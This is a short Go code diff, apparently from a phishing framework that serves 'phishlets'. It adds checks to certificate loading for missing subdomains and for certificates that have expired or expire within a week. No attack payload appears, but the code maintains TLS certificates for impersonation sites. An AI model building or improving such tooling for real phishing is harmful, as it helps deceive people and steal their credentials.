@@ -246,7 +246,7 @@ func (d *CertDb) SetupPhishletCertificate(site_name string, domains []string) er
 		return fmt.Errorf("phishlet '%s' not found", site_name)
 	}
 
-	err := d.loadPhishletCertificate(site_name, base_domain)
+	err := d.loadPhishletCertificate(site_name, base_domain, domains)
 	if err != nil {
 		log.Warning("failed to load certificate files for phishlet '%s', domain '%s': %v", site_name, base_domain, err)
 		log.Info("requesting SSL/TLS certificates from LetsEncrypt...")
@@ -277,13 +277,46 @@ func (d *CertDb) addPhishletCertificate(site_name string, base_domain string, ce
 	d.phishletCache[base_domain][site_name] = cert
 }
 
-func (d *CertDb) loadPhishletCertificate(site_name string, base_domain string) error {
+func (d *CertDb) loadPhishletCertificate(site_name string, base_domain string, domains []string) error {
 	crt_dir := filepath.Join(d.dataDir, base_domain)
 
 	cert, err := tls.LoadX509KeyPair(filepath.Join(crt_dir, site_name+".crt"), filepath.Join(crt_dir, site_name+".key"))
 	if err != nil {
 		return err
 	}
+
+	cert_x509, err := x509.ParseCertificate(cert.Certificate[0])
+	if err != nil {
+		return err
+	}
+
+	// ensure that there are no new subdomains
+	for _, domain := range domains {
+		found := false
+		for _, DNSName := range cert_x509.DNSNames {
+			if domain == DNSName {
+				found = true
+				break
+			}
+		}
+		if !found {
+			return fmt.Errorf("the '%s' sub domain is not supported", domain)
+		}
+	}
+
+	// check if the certificate is expired
+	now := time.Now()
+	if now.After(cert_x509.NotAfter) {
+		return fmt.Errorf("the certificate is expired")
+	}
+
+	// check if the certificate expires in less than one week
+	one_week := 7 * 24 * time.Hour
+	next_week := now.Add(one_week)
+	if next_week.After(cert_x509.NotAfter) {
+		return fmt.Errorf("the certificate expires in less than a week")
+	}
+
 	d.addPhishletCertificate(site_name, base_domain, &cert)
 	return nil
 }
@@ -451,3 +484,4 @@ func (d *CertDb) SignCertificateForHost(host string, phish_host string, port int
 	d.tls_cache[host] = cert
 	return cert, nil
 }
+
